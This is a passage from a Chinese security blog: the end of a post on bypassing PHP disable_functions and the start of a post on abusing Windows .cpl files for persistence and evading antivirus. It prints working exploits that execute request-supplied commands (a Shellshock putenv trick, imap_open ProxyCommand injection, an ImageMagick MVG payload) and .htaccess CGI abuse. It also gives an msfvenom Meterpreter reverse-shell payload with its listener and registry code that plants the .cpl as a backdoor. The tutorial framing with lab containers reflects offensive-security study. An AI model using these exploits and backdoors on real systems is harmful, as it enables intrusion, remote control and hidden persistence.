class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><br><span class="hljs-comment"># Google Dork: none </span><br><span class="hljs-comment"># Date: 10/31/2014 </span><br><span class="hljs-comment"># Exploit Author: Ryan King (Starfall) </span><br><span class="hljs-comment"># Vendor Homepage: http://php.net </span><br><span class="hljs-comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><br><span class="hljs-comment"># Version: 5.* (tested on 5.6.2) </span><br><span class="hljs-comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><br><span class="hljs-comment"># CVE: CVE-2014-6271 </span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span><br>   <span class="hljs-variable">$tmp</span> = tempnam(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>); <br>   putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$cmd</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>); <br>   <span class="hljs-comment">// In Safe Mode, the user may only alter environment variableswhose names </span><br>   <span class="hljs-comment">// begin with the prefixes supplied by this directive. </span><br>   <span class="hljs-comment">// By default, users will only be able to set environment variablesthat </span><br>   <span class="hljs-comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="hljs-doctag">Note:</span> if this directive isempty, </span><br>   <span class="hljs-comment">// PHP will let the user modify ANY environment variable! </span><br>   <span class="hljs-comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span><br>   error_log(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br>   <span class="hljs-variable">$output</span> = @file_get_contents(<span class="hljs-variable">$tmp</span>); <br>   @unlink(<span class="hljs-variable">$tmp</span>); <br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span> != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>; <br>   <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; <br>&#125; <br><span class="hljs-keyword">echo</span> shellshock(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <br><span class="hljs-meta">?&gt;</span>     <br></code></pre></td></tr></table></figure><p>选择可上传目录路径,上传exp<br><img src="/img/bypass_disable_function/24.png"></p><p>包含文件执行<br><img src="/img/bypass_disable_function/25.png"></p><h2 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h2><p>利用条件需要安装iamp扩展,命令行输入:<code>apt-get install php-imap</code><br>在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。</p><p><img src="/img/bypass_disable_function/17.png"></p><p>基本原理为:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的<span class="hljs-built_in">exec</span> 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意<span class="hljs-built_in">shell</span>命令。<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;imap_open&#x27;</span>)) &#123; <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no imap_open function!&quot;</span>); <br>&#125; <br><span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;x -oProxyCommand=echot&quot;</span> . base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] .<br><span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&quot;|base64t-d|sh&#125;&quot;</span>; <br><span class="hljs-comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] .</span><br><span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&#x27;|base64$IFS$()-d|sh&#125;&#x27;</span>; <br>imap_open(<span class="hljs-string">&#x27;&#123;&#x27;</span> . <span class="hljs-variable">$server</span> . <span class="hljs-string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// or</span><br>var_dump(<span class="hljs-string">&quot;nnError: &quot;</span>.imap_last_error()); <br>sleep(<span class="hljs-number">5</span>); <br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/cmd_result&quot;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用Pcntl组件"><a href="#利用Pcntl组件" class="headerlink" title="利用Pcntl组件"></a>利用Pcntl组件</h2><p>如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/pcntl_exec/exp.php">exp</a>为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pcntl_exec().php</span><br><span class="hljs-meta">&lt;?php</span> pcntl_exec(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/b4dboy.sh&quot;</span>));<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#/tmp/b4dboy.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ls -l /<br></code></pre></td></tr></table></figure><h2 id="利用ImageMagick-漏洞绕过-CVE-2016–3714"><a href="#利用ImageMagick-漏洞绕过-CVE-2016–3714" class="headerlink" title="利用ImageMagick 漏洞绕过(CVE-2016–3714)"></a>利用ImageMagick 漏洞绕过(CVE-2016–3714)</h2><p>利用条件:</p><ul><li>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</li><li>安装了php-imagick拓展并在php.ini中启用；</li><li>编写php通过new Imagick对象的方式来处理图片等格式文件；</li><li>PHP &gt;= 5.4</li></ul><h3 id="ImageMagick介绍"><a href="#ImageMagick介绍" class="headerlink" title="ImageMagick介绍"></a>ImageMagick介绍</h3><p>ImageMagick是一套功能强大、稳定而且开源的工具集和开发包,可以用来读、写和处理超过89种基本格式的图片文件,包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。众多的网站平台都是用他渲染处理图片。可惜在3号时被公开了一些列漏洞,其中一个漏洞可导致远程执行代码(RCE),如果你处理用户提交的图片。该漏洞是针对在野外使用此漏洞。许多图像处理插件依赖于ImageMagick库,包括但不限于PHP的imagick,Ruby的rmagick和paperclip,以及NodeJS的ImageMagick等。</p><p>产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。</p><p>据ImageMagick官方，目前程序存在一处远程命令执行漏洞（CVE-2016-3714），当其处理的上传图片带有攻击代码时，可远程实现远程命令执行，进而可能控制服务器，此漏洞被命名为ImageTragick。<br><a href="https://www.exploit-db.com/exploits/39766">EXP</a>如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br>file_put_contents(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> Imagick();<br><span class="hljs-variable">$thumb</span>-&gt;readImage(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;writeImage(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;clear();<br><span class="hljs-variable">$thumb</span>-&gt;destroy();<br>unlink(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br>unlink(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>漏洞原理参考p牛文章:<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>获取和运行镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull medicean/vulapps:i_imagemagick_<span class="hljs-number">1</span><br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8000</span>:<span class="hljs-number">80</span> --name=i_imagemagick_<span class="hljs-number">1</span> medicean/vulapps:i_imagemagick_<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>访问<code>phpinfo.php</code>,发现开启了imagemagick服务<br><img src="/img/bypass_disable_function/42.png"></p><p>进入容器:<code>docker run -t -i medicean/vulapps:i_imagemagick_1  &quot;/bin/bash&quot;</code></p><p><img src="/img/bypass_disable_function/38.png"></p><p>查看<code>poc.php</code>,这其实是已经写好的poc,执行命令就是<code>ls -la</code><br><img src="/img/bypass_disable_function/39.png"></p><p>验证poc,在容器外执行<code>docker exec i_imagemagick_1 convert /poc.png 1.png</code><br><img src="/img/bypass_disable_function/40.png"></p><h2 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a>利用 Apache Mod CGI</h2><p>利用条件:</p><ul><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi, rewrite</li><li>Web 目录给了 AllowOverride 权限</li></ul><h3 id="关于mod-cgi是什么"><a href="#关于mod-cgi是什么" class="headerlink" title="关于mod_cgi是什么"></a>关于mod_cgi是什么</h3><p><a href="http://httpd.apache.org/docs/current/mod/mod_cgi.html">http://httpd.apache.org/docs/current/mod/mod_cgi.html</a><br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。<br>当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。</p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>由于环境搭建困难,使用蚁剑的<a href="https://github.com/AntSwordProject/AntSword-Labs">docker</a><br><img src="/img/bypass_disable_function/21.png"></p><p>在web目录下上传<code>.htaccess</code>文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGI<br>AddHandler cgi-script .<span class="hljs-keyword">ant</span><br></code></pre></td></tr></table></figure><p>上传shell.ant</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> Content-type: text/html<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span>&amp;&amp;id<br></code></pre></td></tr></table></figure><p>由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。<br><img src="/img/bypass_disable_function/22.png"></p><p>直接访问shell.xxx ,这里报错,是因为没有权限访问<br><img src="/img/bypass_disable_function/19.png"></p><p>直接使用蚁剑修改权限<br><img src="/img/bypass_disable_function/20.png"></p><p>复现成功<br><img src="/img/bypass_disable_function/23.png"></p><h2 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a>利用攻击PHP-FPM</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP-FPM</li><li>存在可写的目录, 需要上传 .so 文件</li></ul><p>关于什么是PHP-FPM,这个可以看<a href="https://www.php.cn/php-weizijiaocheng-455614.html">https://www.php.cn/php-weizijiaocheng-455614.html</a><br>关于如何攻击PHP-FPM,请看这篇<a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a></p><p>蚁剑环境</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AntSwordProject/</span>AntSword-Labs.git<br>cd AntSword-Labs<span class="hljs-regexp">/bypass_disable_functions/</span><span class="hljs-number">5</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>连接shell后无法执行命令<br><img src="/img/bypass_disable_function/27.png"></p><p>查看phpinfo,发现目标主机配置了<code>FPM/Fastcgi</code><br><img src="/img/bypass_disable_function/26.png"></p><p>使用插件<br><img src="/img/bypass_disable_function/28.png"></p><p>要注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，本例中PHP-FPM 的接口地址，发现是 127.0.0.1:9000,所以这里改为127.0.0.1：9000<br><img src="/img/bypass_disable_function/29.png"></p><p>但是这里我死活利用不了<br><img src="/img/bypass_disable_function/30.png"></p><p>这里换了几个版本还是不行，但看网上师傅利用是没问题的<br>有感兴趣想复现师傅看这里:<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p><h2 id="利用-GC-UAF"><a href="#利用-GC-UAF" class="headerlink" title="利用 GC UAF"></a>利用 GC UAF</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">EXP</a><br><a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/">关于原理</a><br>通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。</p><p>搭建环境</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd AntSword-Labs<span class="hljs-regexp">/bypass_disable_functions/</span><span class="hljs-number">6</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>受到disable_function无法执行命令<br><img src="/img/bypass_disable_function/32.png"></p><p>使用插件成功执行后弹出一个新的虚拟终端，成功bypass<br><img src="/img/bypass_disable_function/31.png"></p><h2 id="利用-Json-Serializer-UAF"><a href="#利用-Json-Serializer-UAF" class="headerlink" title="利用 Json Serializer UAF"></a>利用 Json Serializer UAF</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><p><a href="https://bugs.php.net/bug.php?id=77843">利用漏洞</a><br><a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">POC</a></p><p>上传POC到<code>/var/tmp</code>目录下<br><img src="/img/bypass_disable_function/33.png"></p><p>包含bypass文件</p><p><img src="/img/bypass_disable_function/34.png"></p><p>也可以稍作修改</p><p><img src="/img/bypass_disable_function/35.png"></p><p><img src="/img/bypass_disable_function/36.png"></p><p>当然使用插件是最简单的</p><p><img src="/img/bypass_disable_function/37.png"></p><h2 id="利用Backtrace-UAF"><a href="#利用Backtrace-UAF" class="headerlink" title="利用Backtrace UAF"></a>利用Backtrace UAF</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p><a href="https://bugs.php.net/bug.php?id=76047">利用漏洞</a><br><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">EXP</a></p><h2 id="利用iconv"><a href="#利用iconv" class="headerlink" title="利用iconv"></a>利用iconv</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li><code>putenv</code></li><li><code>iconv</code></li><li>存在可写的目录, 需要上传 <code>.so</code> 文件</li></ul><p>利用原理分析<a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p><p>利用复现:<br>获得镜像</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AntSwordProject/</span>AntSword-Labs.git<br>cd AntSword-Labs<span class="hljs-regexp">/bypass_disable_functions/</span><span class="hljs-number">9</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>无法执行命令<br><img src="/img/bypass_disable_function/44.png"></p><p>使用iconv插件bypass<br><img src="/img/bypass_disable_function/43.png"></p><p>创建副本后,将url改为<code>/.antproxy.php</code><br><img src="/img/bypass_disable_function/45.png"></p><p><img src="/img/bypass_disable_function/46.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Bypass-3">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Bypass-3</a><br><a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/</a><br><a href="https://clq0.top/bypass-disable_function-php/#iconv">https://clq0.top/bypass-disable_function-php/#iconv</a><br><a href="https://github.com/AntSwordProject/AntSword-Labs">https://github.com/AntSwordProject/AntSword-Labs</a><br><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html">https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>巧用cpl文件维权和免杀</title>
    <link href="/2021/07/31/cpl/"/>
    <url>/2021/07/31/cpl/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近无意间发现了cpl文件,之前对该类型的文件了解几乎为零,由于触及到我的知识盲区,于是决定探究。</p><h2 id="cpl文件"><a href="#cpl文件" class="headerlink" title="cpl文件"></a>cpl文件</h2><p>CPL文件，是Windows控制面板扩展项，CPL全拼为<code>Control Panel Item</code><br>在system32目录下有一系列的cpl文件,分别对应着各种控制面板的子选项<br><img src="/img/cpl/1.png"></p><p>列入我们<code>win+R</code>输入<code>main.cpl</code><br><img src="/img/cpl/2.png"></p><p>将会打开控制面板中的鼠标属性<br><img src="/img/cpl/3.png"></p><p>cpl文件本质是属于PE文件<br><img src="/img/cpl/4.png"></p><p>但cpl并不像exe,更像是dll,无法直接打开,只能以加载的形式运行。<br>并且有一个导出函数<code>CPlApplet</code><br>该函数是控制面板应用程序的入口点，它被控制面板管理程序自动调用，且是个回调函数。<br><img src="/img/cpl/5.png"></p><h2 id="如何打开cpl"><a href="#如何打开cpl" class="headerlink" title="如何打开cpl"></a>如何打开cpl</h2><p>1.双击或者win+r xxx.cpl<br>2.control &lt;文件名&gt;<br>3.rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;<br>注意：所有rundll32 shell32.dll,Control_RunDLL的命令均可用control替代，control.exe实质调用了rundll32.exe。打开后找不到control.exe进程，只能找到rundll32.exe。</p><p><img src="/img/cpl/6.png"></p><p>4.vbs脚本</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> obj<br><span class="hljs-keyword">Set</span> obj = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br>obj.ControlPanelItem(<span class="hljs-string">&quot;C:\Users\11793\Desktop\cpl.cpl&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/cpl/8.png"></p><p>5.js脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Shell.Application&quot;</span>);<br>a.ControlPanelItem(<span class="hljs-string">&quot;C:\\Users\\11793\\Desktop\\cpl.cpl&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/cpl/9.png"></p><h2 id="如何自己制造一个cpl文件"><a href="#如何自己制造一个cpl文件" class="headerlink" title="如何自己制造一个cpl文件"></a>如何自己制造一个cpl文件</h2><p>最简单的方式:直接创建一个dll,无需导出函数,然后改后缀名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">WinExec</span>(<span class="hljs-string">&quot;Calc.exe&quot;</span>, SW_SHOW);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>随便一种方式执行<br><img src="/img/cpl/7.png"></p><p>这里既然可以弹出calc.exe,那么能不能执行自己的payload的呢,答案是肯定的。</p><h2 id="cpl文件的应用"><a href="#cpl文件的应用" class="headerlink" title="cpl文件的应用"></a>cpl文件的应用</h2><h3 id="bypass-Windows-AppLocker"><a href="#bypass-Windows-AppLocker" class="headerlink" title="bypass Windows AppLocker"></a>bypass Windows AppLocker</h3><p>什么是<code>Windows AppLocker</code>:<br>AppLocker即“应用程序控制策略”，是Windows 7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能。</p><p>默认的Applocker规则集合,可以看到cpl并不在默认规则中:<br><img src="/img/cpl/18.png"></p><p>开启Applocker规则:<br>打开计算机管理,选择服务,将<code>Application Identity</code>服务开启<br><img src="/img/cpl/19.png"></p><p>然后在安全策略中,添加一条applocker规则,会询问是否添加默认规则<br><img src="/img/cpl/20.png"></p><p>默认规则为:<br><img src="/img/cpl/21.png"></p><p>假设设置某一路径无法执行可执行程序,再次运行时就会提示组策略安全,不允许运行<br><img src="/img/cpl/22.png"></p><p>绕过的方式有很多,这里只讲cpl文件<br>完全可以把代码写入到cpl文件中,同样达到执行目的,这里就弹一个cmd<br><img src="/img/cpl/23.png"></p><h3 id="msf直接生成cpl文件"><a href="#msf直接生成cpl文件" class="headerlink" title="msf直接生成cpl文件"></a>msf直接生成cpl文件</h3><p>生成cpl文件<br><code>msfvenom -p windows/meterpreter/reverse_tcp -b &#39;\x00\xff&#39; lhost=192.168.111.128 lport=8877 -f dll -o cpl.cpl</code><br><img src="/img/cpl/10.png"></p><p>将文件拖到本地并运行,msf监听</p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.111.128</li><li>set lport 8877</li><li>exploit</li></ul><p><img src="/img/cpl/11.png"><br>这样肯定是不够的,可以把这个cpl文件当作一个后门,做到一个权限维持的效果,且比较隐蔽。<br>将cpl文件名称改为<code>test.cpl</code><br>创建一个项目,作用为修改注册表:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">HKEY hKey;<br>DWORD dwDisposition;<br><span class="hljs-keyword">char</span> path[] = <span class="hljs-string">&quot;C:\\test.cpl&quot;</span>;<br><span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_CURRENT_USER,<span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WRITE, <span class="hljs-literal">NULL</span>, &amp;hKey, &amp;dwDisposition);<br><span class="hljs-built_in">RegSetValueExA</span>(hKey, <span class="hljs-string">&quot;test.cpl&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)path, (<span class="hljs-number">1</span> + ::<span 